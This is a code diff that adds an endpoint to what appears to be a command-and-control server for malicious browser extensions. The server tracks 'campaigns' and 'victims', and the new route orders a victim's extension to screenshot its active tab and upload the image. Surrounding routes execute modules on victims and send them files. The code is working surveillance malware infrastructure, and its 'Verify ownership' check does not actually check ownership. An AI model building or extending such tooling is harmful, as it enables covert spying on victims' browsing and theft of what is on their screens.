@@ -529,6 +529,61 @@ async def execute_module(
     return {"success": True, "message": "Module executed"}
 
 
+@router.post("/{campaign_id}/victims/{victim_id}/capture-snapshot")
+async def capture_snapshot(
+    campaign_id: str,
+    victim_id: str,
+    db: Session = Depends(get_db),
+    current_user: User = Depends(require_campaign_write_access)
+):
+    """Ask the victim's browser extension to snapshot its active tab."""
+    # ✅ Verify ownership
+    campaign = db.query(Campaign).filter(Campaign.id == campaign_id).first()
+
+    if not campaign:
+        raise HTTPException(403, "Not your campaign")
+
+    # ✅ Verify victim exists
+    victim = db.query(Victim).filter(
+        Victim.id == victim_id,
+        Victim.campaign_id == campaign_id
+    ).first()
+
+    if not victim:
+        raise HTTPException(404, "Victim not found")
+
+    # ✅ Register the request with the internal campaign API; the victim's
+    # browser extension polls for it and uploads the captured PNG.
+    internal_api_url = f"http://{campaign.container_name}:8080/api/sessions/{victim_id}/snapshot-requests"
+    headers = campaign_internal_headers(campaign_id)
+
+    async with httpx.AsyncClient() as client:
+        try:
+            response = await client.post(
+                internal_api_url,
+                headers=headers,
+                timeout=10.0
+            )
+            response.raise_for_status()
+        except httpx.HTTPError as exc:
+            logger.exception("Campaign snapshot service request failed")
+            raise HTTPException(
+                502,
+                "Campaign service request failed",
+            ) from exc
+
+    request_id = response.json().get("request_id")
+
+    logger.info(
+        "Snapshot requested for victim %s in campaign %s (by %s)",
+        victim_id,
+        campaign_id,
+        current_user.username,
+    )
+
+    return {"success": True, "request_id": request_id}
+
+
 @router.post("/{campaign_id}/victims/{victim_id}/send-file")
 async def send_file_to_victim(
     campaign_id: str,
